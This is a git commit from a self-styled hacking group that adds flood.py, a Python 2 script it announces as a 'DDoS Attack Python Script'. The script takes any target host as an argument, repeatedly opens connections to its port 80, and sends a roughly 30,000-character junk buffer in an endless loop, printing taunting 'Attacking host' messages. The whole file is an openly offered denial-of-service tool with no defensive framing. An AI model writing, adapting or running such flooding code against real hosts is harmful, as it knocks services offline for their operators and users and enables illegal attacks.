20518bffb324e2ea9672ec92a07b48fe24c9f6fa
T34CH3RHackTeam <pro-1913@inbox.ru>
2016-11-23 21:11:13 +0400

    Add files via upload

---
+++ flood.py
@@ -0,0 +1,25 @@
+import sys, socket, time, random
+def fuckPacket_Main(host):
+	print "-=]T34CH3R HackTeam DDoS Attack Python Script[=-"
+	print "            -=]We Are Legion.[=-"
+	buff = random.choice("qwertyuiopasdfghjklzxcvbnm")+" "+random.choice("zxcvbnmasdfghjklqwertyuiop")+"XXX"*10000
+	while True:	
+		try:
+			sock = socket.socket()
+			sock.connect((host, 80))
+		except:
+			print "[-]Fail Connect :("
+			sys.exit(1)
+		
+		print "[***]Attacking host: http://"+host+" [^^^]Sending super packet "+random.choice("qwertyuiopasdfghjklzxcvbnm")+" "+random.choice("qwertyuiopasdfghjklzxcvbnm")+" "+random.choice("qwertyuiopasdfghjklzxcvbnm")+" "+random.choice("qwertyuiopasdfghjklzxcvbnm")+" "+random.choice("qwertyuiopasdfghjklzxcvbnm")+" "+random.choice("qwertyuiopasdfghjklzxcvbnm")+" "+random.choice("qwertyuiopasdfghjklzxcvbnm")+" "+random.choice("qwertyuiopasdfghjklzxcvbnm")+" "+random.choice("qwertyuiopasdfghjklzxcvbnm")+" "+random.choice("qwertyuiopasdfghjklzxcvbnm")+" "+random.choice("qwertyuiopasdfghjklzxcvbnm")+" "+random.choice("qwertyuiopasdfghjklzxcvbnm")+" "+random.choice("qwertyuiopasdfghjklzxcvbnm")+" "+random.choice("qwertyuiopasdfghjklzxcvbnm")+" "+random.choice("qwertyuiopasdfghjklzxcvbnm")+" "+random.choice("qwertyuiopasdfghjklzxcvbnm")+" "+random.choice("qwertyuiopasdfghjklzxcvbnm")+" "+random.choice("qwertyuiopasdfghjklzxcvbnm")+" "+random.choice("qwertyuiopasdfghjklzxcvbnm")+" "+random.choice("qwertyuiopasdfghjklzxcvbnm")+" "+random.choice("qwertyuiopasdfghjklzxcvbnm")
+		sock.send(buff)
+		sock.close()
+def fuckPacket_Param():
+	try:
+		host = sys.argv[1]
+	except:
+		print "-=] Usage: "+sys.argv[0]+" <target host> [=-"
+		sys.exit(1)
+	
+	fuckPacket_Main(host)
+fuckPacket_Param()
